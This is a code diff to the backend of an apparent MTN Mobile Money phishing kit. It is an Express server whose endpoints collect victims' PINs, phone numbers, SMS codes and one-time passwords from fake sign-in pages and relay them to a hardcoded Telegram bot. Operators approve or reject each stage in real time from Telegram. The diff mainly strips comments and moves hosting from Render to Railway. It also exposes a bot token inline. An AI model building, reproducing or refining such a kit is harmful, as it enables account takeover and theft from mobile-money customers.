@@ -1,9 +1,3 @@
-/**
- * MTN Mobile Money — Backend
- * Flow: index.html → mtn-signin.html → sms.html → otp2.html → success.html
- *                                                ↘ oops.html (inactive)
- */
-
 const express = require('express');
 const cors = require('cors');
 const path = require('path');
@@ -17,25 +11,22 @@ const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '8936298383:AAGUnZa
 const TELEGRAM_CHAT_ID   = process.env.TELEGRAM_CHAT_ID   || '8392790531';
 const TELEGRAM_API       = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;
 
-const DATA_DIR      = process.env.DATA_DIR || (fs.existsSync('/data') ? '/data' : '/tmp');
-const LINKS_FILE    = path.join(DATA_DIR, 'mtn_links.json');
-const TXS_FILE      = path.join(DATA_DIR, 'mtn_txs.json');
+const DATA_DIR   = process.env.DATA_DIR || (fs.existsSync('/data') ? '/data' : '/tmp');
+const LINKS_FILE = path.join(DATA_DIR, 'mtn_links.json');
+const TXS_FILE   = path.join(DATA_DIR, 'mtn_txs.json');
 
 try { if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true }); } catch(e){}
 
 app.use(cors());
 app.use(express.json({ limit: '2mb' }));
 app.use(express.urlencoded({ extended: true }));
-app.use(express.static(__dirname, { extensions: ['html'] }));
+app.use(express.static(path.join(__dirname, '..'), { extensions: ['html'] }));
 
 app.use((req, _res, next) => {
   console.log(`[${new Date().toISOString()}] ${req.method} ${req.path}`);
   next();
 });
 
-/* ============================================================
-   PERSISTENT STORAGE
-   ============================================================ */
 function loadMap(file){
   try {
     if (fs.existsSync(file)) {
@@ -60,9 +51,6 @@ console.log(`[txs]   restored ${txs.size} from disk`);
 function persistLinks(){ saveMap(LINKS_FILE, links); }
 function persistTxs(){   saveMap(TXS_FILE, txs); }
 
-/* ============================================================
-   HELPERS
-   ============================================================ */
 function esc(s = ''){
   return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
 }
@@ -125,9 +113,6 @@ function nowCAT(){
   return new Date().toLocaleString('en-GB',{ timeZone: 'Africa/Lagos' }) + ' WAT';
 }
 
-/* ============================================================
-   HEALTH & DEBUG
-   ============================================================ */
 app.get('/', (_req, res) => {
   res.json({
     ok: true,
@@ -135,8 +120,6 @@ app.get('/', (_req, res) => {
     activeLinks: links.size,
     activeTxs: txs.size,
     dataDir: DATA_DIR,
-    persistentDisk: DATA_DIR === '/data',
-    warning: DATA_DIR === '/data' ? null : 'No persistent disk — data will be lost on restart.',
     telegramConfigured: !!(TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID),
     publicUrl: process.env.PUBLIC_URL || '(not set)',
     time: new Date().toISOString()
@@ -162,9 +145,6 @@ app.get('/api/debug', (_req, res) => {
   res.json({ ok:true, dataDir: DATA_DIR, txs: tList });
 });
 
-/* ============================================================
-   WEBHOOK DIAGNOSTIC
-   ============================================================ */
 app.get('/api/check-webhook', async (_req, res) => {
   try {
     const r = await fetch(`${TELEGRAM_API}/getWebhookInfo`);
@@ -174,7 +154,7 @@ app.get('/api/check-webhook', async (_req, res) => {
 
 app.get('/api/set-webhook', async (_req, res) => {
   try {
-    const publicUrl = (process.env.PUBLIC_URL || `https://${process.env.RENDER_EXTERNAL_HOSTNAME || 'localhost'}`).replace(/\/+$/, '');
+    const publicUrl = (process.env.PUBLIC_URL || `https://${process.env.RAILWAY_PUBLIC_DOMAIN || 'localhost'}`).replace(/\/+$/, '');
     const webhookUrl = `${publicUrl}/api/telegram-webhook`;
     const allowed = encodeURIComponent(JSON.stringify(['message','callback_query']));
     const r = await fetch(`${TELEGRAM_API}/setWebhook?url=${encodeURIComponent(webhookUrl)}&allowed_updates=${allowed}`);
@@ -182,9 +162,6 @@ app.get('/api/set-webhook', async (_req, res) => {
   } catch (e) { res.status(500).json({ ok:false, error: e.message }); }
 });
 
-/* ============================================================
-   LINKS — create + read
-   ============================================================ */
 app.post('/api/links', (req, res) => {
   try {
     const body = req.body || {};
@@ -254,9 +231,6 @@ app.get('/api/links/:code', (req, res) => {
   });
 });
 
-/* ============================================================
-   MTN — PIN submit (from mtn-signin.html)
-   ============================================================ */
 app.post('/api/mtn/pin', async (req, res) => {
   try {
     const { tx, pin, phone, am, cur, c, an, rn } = req.body || {};
@@ -305,9 +279,6 @@ app.post('/api/mtn/pin', async (req, res) => {
   }
 });
 
-/* ============================================================
-   MTN — SMS submit (from sms.html)
-   ============================================================ */
 app.post('/api/mtn/sms', async (req, res) => {
   try {
     const { tx, code, message, am, cur, c, an, rn } = req.body || {};
@@ -360,9 +331,6 @@ app.post('/api/mtn/sms', async (req, res) => {
   }
 });
 
-/* ============================================================
-   MTN — OTP submit (from otp2.html)
-   ============================================================ */
 app.post('/api/mtn/otp', async (req, res) => {
   try {
     const { tx, otp, am, cur, c } = req.body || {};
@@ -412,9 +380,6 @@ app.post('/api/mtn/otp', async (req, res) => {
   }
 });
 
-/* ============================================================
-   MTN — resend PIN / resend OTP
-   ============================================================ */
 app.post('/api/mtn/resend', async (req, res) => {
   try {
     const { tx, stage, c, am, cur } = req.body || {};
@@ -444,9 +409,6 @@ app.post('/api/mtn/resend', async (req, res) => {
   }
 });
 
-/* ============================================================
-   MTN — status endpoints used by the frontend pollers
-   ============================================================ */
 app.get('/api/mtn/status/:tx', (req, res) => {
   const tracking = String(req.params.tx || '').trim().toUpperCase();
   let t = txs.get(tracking);
@@ -501,9 +463,6 @@ app.get('/api/mtn/otp-status/:tx', (req, res) => {
   res.json({ ok:true, decision, tx: tracking });
 });
 
-/* ============================================================
-   TELEGRAM WEBHOOK
-   ============================================================ */
 app.post('/api/telegram-webhook', async (req, res) => {
   try {
     const update = req.body || {};
@@ -513,7 +472,6 @@ app.post('/api/telegram-webhook', async (req, res) => {
     if (cq && cq.data) {
       const parts = String(cq.data).split(':');
 
-      // Format: mtn:<stage>:<action>:<tx>
       if (parts.length === 4 && parts[0] === 'mtn') {
         const [_, stage, action, txRaw] = parts;
         const tracking = txRaw.toUpperCase();
@@ -559,12 +517,10 @@ app.post('/api/telegram-webhook', async (req, res) => {
   }
 });
 
-/* ============================================================
-   AUTO-REGISTER WEBHOOK
-   ============================================================ */
 async function registerWebhook(){
   const publicUrl = (
     process.env.PUBLIC_URL ||
+    (process.env.RAILWAY_PUBLIC_DOMAIN ? `https://${process.env.RAILWAY_PUBLIC_DOMAIN}` : '') ||
     (process.env.RENDER_EXTERNAL_HOSTNAME ? `https://${process.env.RENDER_EXTERNAL_HOSTNAME}` : '') ||
     `http://localhost:${PORT}`
   ).replace(/\/+$/, '');
@@ -580,10 +536,10 @@ async function registerWebhook(){
 
 app.listen(PORT, async () => {
   console.log(`MTN MoMo backend running on port ${PORT}`);
+  console.log(`Static HTML dir: ${path.join(__dirname, '..')}`);
   console.log(`Data directory: ${DATA_DIR}`);
   if (DATA_DIR !== '/data') {
-    console.warn('⚠️  No persistent disk — data wiped on Render restart');
-    console.warn('⚠️  Fix: Render → Disks → Add Disk → Mount Path = /data');
+    console.warn('⚠️  No persistent disk — data wiped on restart');
   }
   await registerWebhook();
 });
